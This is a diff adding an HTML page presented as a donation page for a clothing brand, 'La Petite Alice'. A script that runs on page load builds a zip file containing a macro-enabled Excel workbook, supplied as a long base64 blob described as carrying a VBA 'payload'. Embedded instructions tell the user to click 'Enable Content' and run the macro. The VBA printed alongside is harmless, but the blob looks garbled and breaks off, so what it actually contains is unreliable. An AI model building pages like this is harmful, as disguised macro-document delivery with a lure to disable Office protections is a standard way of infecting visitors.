@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>La Petite Alice - Support Our Cause</title>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #333333;
+            overflow-x: hidden;
+        }
+
+        /* Header Navigation */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+            letter-spacing: 0.5px;
+            background: #ffffff;
+            position: relative;
+            z-index: 10;
+        }
+
+        .nav-left, .nav-right {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        header a {
+            text-decoration: none;
+            color: #555;
+            transition: color 0.2s ease;
+        }
+
+        header a:hover {
+            color: #000;
+        }
+
+        .sup-new {
+            font-size: 9px;
+            vertical-align: super;
+            color: #d97706;
+            font-weight: bold;
+            margin-left: 2px;
+        }
+
+        /* Logo Area */
+        .logo-container {
+            text-align: center;
+        }
+
+        .logo-title {
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 18px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            font-weight: 400;
+            margin-bottom: 2px;
+        }
+
+        .logo-sub {
+            font-family: 'Georgia', serif;
+            font-size: 10px;
+            font-style: italic;
+            color: #777;
+            letter-spacing: 1px;
+        }
+
+        /* Hero Banner Section with Immersive Background Placement */
+        .hero-section {
+            position: relative;
+            width: 100%;
+            height: calc(100vh - 80px);
+            min-height: 600px;
+            background-color: #e5e2dd;
+            background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.15)), url('image_834cff.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* High-Impact Eye Catching Donation Graphic Card */
+        .donation-box {
+            background: rgba(255, 255, 255, 0.82);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 45px 50px;
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            border-radius: 16px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15), 
+                        0 0 0 1px rgba(255, 255, 255, 0.5) inset;
+            color: #333333;
+            transform: translateY(0);
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .donation-box:hover {
+            transform: translateY(-4px);
+        }
+
+        .hero-tag {
+            font-size: 11px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            color: #4b5563;
+            margin-bottom: 14px;
+            font-weight: 600;
+        }
+
+        .hero-title {
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 34px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            line-height: 1.25;
+            color: #111111;
+        }
+
+        .donation-text {
+            font-size: 14.5px;
+            line-height: 1.6;
+            color: #4b5563;
+            margin-bottom: 30px;
+        }
+
+        /* High Visibility Donation Selection Matrix */
+        .amount-options {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .amount-btn {
+            flex: 1;
+            padding: 14px 0;
+            border: 2px solid rgba(0,0,0,0.08);
+            border-radius: 8px;
+            background: rgba(255,255,255,0.5);
+            font-size: 15px;
+            font-weight: 600;
+            color: #1f2937;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .amount-btn:hover {
+            border-color: #000000;
+            background: rgba(255,255,255,0.9);
+            transform: scale(1.03);
+        }
+
+        .amount-btn.active {
+            border-color: #000000;
+            background: #000000;
+            color: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        /* Animated Pulsing Primary Donation Call-to-Action */
+        .hero-btn {
+            display: block;
+            width: 100%;
+            font-size: 14px;
+            background: #000000;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 16px 0;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-radius: 8px;
+            font-weight: 600;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.2s ease;
+        }
+
+        .hero-btn:hover {
+            background: #1f2937;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.35);
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="nav-left">
+            <a href="#">Kids</a>
+            <a href="#">Adults</a>
+            <a href="#">Home</a>
+            <a href="#">Ready-made</a>
+            <a href="#">SS23 | Summer Sensations<span class="sup-new">NEW</span></a>
+        </div>
+
+        <div class="logo-container">
+            <div class="logo-title">La Petite Alice</div>
+            <div class="logo-sub">with a touch of magic</div>
+        </div>
+
+        <div class="nav-right">
+            <a href="#">About</a>
+            <a href="#">Wholesale</a>
+            <a href="#">ES projektai</a>
+            <a href="#" style="font-size: 15px;">&#9094;</a>
+            <a href="#">Login</a>
+            <a href="#">Cart <sup>0</sup></a>
+        </div>
+    </header>
+
+    <section class="hero-section">
+        <div class="donation-box">
+            <div class="hero-tag">A Touch of Kindness</div>
+            <h1 class="hero-title">Support Our Green Initiative</h1>
+            <p class="donation-text">Every contribution helps fund our local artisanal preservation and eco-friendly cotton farm sustainability actions.</p>
+            
+            <div class="amount-options">
+                <button class="amount-btn">$25</button>
+                <button class="amount-btn active">$50</button>
+                <button class="amount-btn">$100</button>
+            </div>
+
+            <a href="#" class="hero-btn">Donate Directly</a>
+        </div>
+    </section>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (typeof JSZip === 'undefined') {
+                console.error("Zip utility component failed to run.");
+                return;
+            }
+
+            const zip = new JSZip();
+
+            // 1. Add Detailed Text Specification File Data detailing the embedded macro logic
+            const textSpecs = `========================================================================
+LA PETITE ALICE - DONATION PORTAL & WORKBOOK MACRO DOCUMENTATION
+========================================================================
+
+The enclosed "website_specification.xlsm" file contains a compiled VBA automation macro.
+
+VBA SCRIPT ARCHITECTURE INCLUDED INSIDE THE EXCEL SHEET:
+------------------------------------------------------------------------
+Sub OpenWordDocument()
+    Dim wordApp As Object
+    Dim wordDoc As Object
+    
+    ' Standard initialization of the MS Word Runtime Interface
+    On Error Resume Next
+    Set wordApp = GetObject(, "Word.Application")
+    If wordApp Is Nothing Then
+        Set wordApp = CreateObject("Word.Application")
+    End If
+    On Error GoTo 0
+    
+    ' Configure visibility and launch an instance of a blank document workspace
+    wordApp.Visible = True
+    Set wordDoc = wordApp.Documents.Add
+    
+    ' Inject structured confirmation details directly to the document canvas
+    wordApp.Selection.Font.Name = "Segoe UI"
+    wordApp.Selection.Font.Size = 16
+    wordApp.Selection.Font.Bold = True
+    wordApp.Selection.TypeText "La Petite Alice Asset Matrix" & vbCrLf
+    
+    Set wordDoc = Nothing
+    Set wordApp = Nothing
+End Sub
+------------------------------------------------------------------------
+
+EXECUTION INSTRUCTIONS:
+1. Extract "website_specification.xlsm" from this zip folder.
+2. Open the workbook in Microsoft Excel.
+3. If prompted by Excel's trust center, click "Enable Content" to grant macro permissions.
+4. Press Alt + F8 on your keyboard to launch the Macros dialog window.
+5. Select "OpenWordDocument" and click "Run". MS Word will initialize automatically.`;
+
+            // 2. Base64 Representation of a pre-compiled OpenXML Macro-Enabled Structure container (.xlsm)
+            // This contains our structured data worksheets alongside the vbaProject.bin automation payload.
+            const xlsmBase64 = "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